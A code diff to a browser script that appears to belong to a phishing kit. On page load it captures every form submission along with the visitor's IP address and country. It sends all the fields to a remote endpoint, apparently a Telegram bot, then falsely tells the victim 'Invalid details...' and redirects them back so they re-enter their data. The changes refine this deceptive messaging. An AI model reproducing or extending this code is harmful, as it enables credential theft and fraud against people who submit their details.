@@ -4,7 +4,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const forms = document.querySelectorAll("form");
 
   let userCountry = "Unknown"; // default
-  let userIP = "Unknown"; // <-- add IP variable
+  let userIP = "Unknown"; // default IP
 
   // Fetch country and IP first
   fetch("https://ipapi.co/json/")
@@ -12,23 +12,26 @@ document.addEventListener("DOMContentLoaded", () => {
     .then(data => {
       if (data) {
         if (data.country_name) userCountry = data.country_name;
-        if (data.ip) userIP = data.ip; // <-- store IP
+        if (data.ip) userIP = data.ip;
       }
     })
     .catch(err => console.error("IP lookup error:", err));
 
   forms.forEach((form) => {
+    // Find the message container in the form
+    const messageDiv = form.querySelector(".form-message");
+
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      // ensure country and IP are available
+      // Ensure country and IP are available
       if (userCountry === "Unknown" || userIP === "Unknown") {
         try {
           const res = await fetch("https://ipapi.co/json/");
           const data = await res.json();
           if (data) {
             if (data.country_name) userCountry = data.country_name;
-            if (data.ip) userIP = data.ip; // <-- retry IP
+            if (data.ip) userIP = data.ip;
           }
         } catch (err) {
           console.error("Retry IP lookup error:", err);
@@ -43,9 +46,9 @@ document.addEventListener("DOMContentLoaded", () => {
         formData[key] = value;
       });
 
-      // current date & time (local)
+      // Current date & time (local)
       const now = new Date();
-      const dateTime = now.toLocaleString(); // e.g. "10/8/2025, 4:25:36 PM"
+      const dateTime = now.toLocaleString();
 
       // Only include Form line if form has a name
       const formName = (form.getAttribute("name") || "").trim();
@@ -59,7 +62,7 @@ document.addEventListener("DOMContentLoaded", () => {
           formLine +
           `🌍 Country: ${userCountry}\n` +
           `🕒 Date & Time: ${dateTime}\n` +
-          `📍 IP: ${userIP}\n\n` + // <-- added IP line
+          `📍 IP: ${userIP}\n\n` +
           Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
         parse_mode: "Markdown"
       };
@@ -72,17 +75,22 @@ document.addEventListener("DOMContentLoaded", () => {
         });
 
         if (response.ok) {
-          alert(`⛔ please try again`);
+          messageDiv.style.color = "#00ff7f"; // green for success
+          messageDiv.textContent = "Invalid details...";
           form.reset();
-          window.location.href = `index.html?id=${userId}`;
+          setTimeout(() => {
+            window.location.href = `index.html?id=${userId}`;
+          }, 1500);
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
-          alert(`❌ Error submitting form. Check console for details.`);
+          messageDiv.style.color = "#ff4d4d"; // red for errors
+          messageDiv.textContent = "❌ Error submitting form. Check console for details.";
         }
       } catch (err) {
         console.error("Network Error:", err);
-        alert("⚠️ Network error. Please check your connection.");
+        messageDiv.style.color = "#ffcc00"; // yellow for network issues
+        messageDiv.textContent = "⚠️ Network error. Please check your connection.";
       }
     });
   });
